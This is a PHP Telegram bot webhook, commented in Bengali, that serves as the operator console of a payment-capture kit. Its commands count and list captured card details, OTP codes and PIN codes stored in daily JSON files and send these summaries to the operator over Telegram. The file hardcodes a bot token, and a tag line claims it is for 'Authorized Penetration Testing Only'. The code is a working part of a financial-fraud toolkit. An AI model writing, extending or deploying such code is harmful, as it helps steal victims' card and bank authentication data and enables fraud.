<?php
// ============================================
// TELEGRAM BOT CONTROLLER (WEBHOOK)
// ============================================
// এই ফাইলটি টেলিগ্রাম বটের ওয়েবহুক হিসেবে কাজ করে
// ইউজার বটে কমান্ড পাঠাতে পারে

define('BOT_TOKEN', '8285609435:AAEDsESPpDkIEIbtFk3RBwu7O_uiZTYN96s');

$input = file_get_contents('php://input');
$update = json_decode($input, true);

if (!$update) die('No data');

$message = $update['message'] ?? null;
if (!$message) die('No message');

$chatId = $message['chat']['id'];
$text = $message['text'] ?? '';
$username = $message['from']['username'] ?? 'Unknown';

switch ($text) {
    case '/start':
        $reply = "🤖 <b>Payment Capture Bot Active</b>\n\n"
               . "📌 <b>Commands:</b>\n"
               . "/stats - Show capture statistics\n"
               . "/last - Show last 5 captures\n"
               . "/help - Show help\n\n"
               . "🔴 <i>Authorized Penetration Testing Only</i>";
        break;
        
    case '/stats':
        $files = glob('captures_*.json');
        $total = 0;
        $cardCount = 0;
        $otpCount = 0;
        $pinCount = 0;
        
        foreach ($files as $file) {
            $data = json_decode(file_get_contents($file), true) ?? [];
            $total += count($data);
            foreach ($data as $item) {
                switch ($item['type']) {
                    case 'card_details': $cardCount++; break;
                    case 'otp': $otpCount++; break;
                    case 'pin': $pinCount++; break;
                }
            }
        }
        
        $reply = "📊 <b>Capture Statistics</b>\n\n"
               . "📁 Files today: " . count($files) . "\n"
               . "💳 Card Details: <b>$cardCount</b>\n"
               . "🔢 OTP Codes: <b>$otpCount</b>\n"
               . "🔐 PIN Codes: <b>$pinCount</b>\n"
               . "━━━━━━━━━━━\n"
               . "📦 Total: <b>$total</b>";
        break;
        
    case '/last':
        $latestFile = 'captures_' . date('Y-m-d') . '.json';
        if (file_exists($latestFile)) {
            $data = json_decode(file_get_contents($latestFile), true) ?? [];
            $last5 = array_slice(array_reverse($data), 0, 5);
            
            if (count($last5) > 0) {
                $reply = "🕐 <b>Last 5 Captures</b>\n\n";
                foreach ($last5 as $i => $item) {
                    $emoji = $item['type'] === 'card_details' ? '💳' : ($item['type'] === 'otp' ? '🔢' : '🔐');
                    $reply .= "$emoji <b>#".($i+1)."</b> - " . $item['type'] . "\n";
                    $reply .= "   Time: " . ($item['timestamp'] ?? 'N/A') . "\n\n";
                }
            } else {
                $reply = "📭 No captures yet today.";
            }
        } else {
            $reply = "📭 No captures yet today.";
        }
        break;
        
    default:
        $reply = "❌ Unknown command: $text\n"
               . "Type /start to see available commands.";
}

// রিপ্লাই পাঠান
$url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $reply,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

?>
